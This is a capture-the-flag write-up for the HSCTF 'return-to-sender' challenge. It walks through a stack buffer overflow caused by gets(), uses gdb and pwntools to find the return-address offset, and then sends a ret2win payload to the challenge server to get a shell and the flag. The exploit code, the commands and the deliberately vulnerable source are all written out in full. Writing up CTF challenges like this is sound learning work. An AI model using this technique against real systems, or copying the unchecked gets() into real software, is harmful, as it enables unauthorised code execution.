We are given an executable [file](./data/return-to-sender) and it's [source code](./data/return-to-sender.c)
```
$ cat return-to-sender.c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void win() {
	system("/bin/sh");
}

void vuln() {
	char dest[8];
	printf("Where are you sending your mail to today? ");
	gets(dest);
	printf("Alright, to %s it goes!\n", dest);
}

int main() {
	setbuf(stdout, NULL);
	gid_t gid = getegid();
	setresgid(gid,gid,gid);
	vuln();
	return 0;	
}
```
In `vuln()` function, there is no boundary checking for `dest`. `gets` takes as long input as you give, so we can do a buffer overflow attack and get access to `win()` function and thus shell access. Let's see!
```
$ gdb return-to-sender
Reading symbols from return-to-sender...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/ghostman/Documents/playground/return to sender/return-to-sender 
Where are you sending your mail to today? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Alright, to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA it goes!

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
The return address has been overwritten to 0x41414141, which is the hex value of A. As long as we can find the correct amount of padding, we can control where the return pointer returns to.

Let's find the correct padding using `De Brujin sequence`. (using pwntools)
```
$ python
>>> from pwn import *
>>> cyclic(100)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

```
$ gdb return-to-sender
Reading symbols from return-to-sender...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/ghostman/Documents/playground/return to sender/return-to-sender 
Where are you sending your mail to today? aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Alright, to aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa it goes!

Program received signal SIGSEGV, Segmentation fault.
0x61616166 in ?? ()
```
It jumped to `0x61616166`. Let's find the offset.
```
$ python
>>> from pwn import *
>>> cyclic_find(p32(0x61616166))
20
```
Great, now let's generate our payload.
```
$ python
>>> from pwn import *
>>> elf = ELF('./return-to-sender')
[*] '/home/ghostman/Documents/playground/return to sender/return-to-sender'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
>>> payload = 'A' * 20 + p32(elf.symbols['win'])
>>> challenge = remote('pwn.hsctf.com', 1234)
[x] Opening connection to pwn.hsctf.com on port 1234
[x] Opening connection to pwn.hsctf.com on port 1234: Trying 165.22.188.9
[+] Opening connection to pwn.hsctf.com on port 1234: Done
>>> challenge.sendline(payload)
>>> challenge.interactive()
[*] Switching to interactive mode
Where are you sending your mail to today? Alright, to AAAAAAAAAAAAAAAAAAAA�� it goes!
ls
bin
dev
flag
lib
lib32
lib64
return-to-sender
return-to-sender.c
cat flag
hsctf{fedex_dont_fail_me_now}
^C[*] Interrupted
```
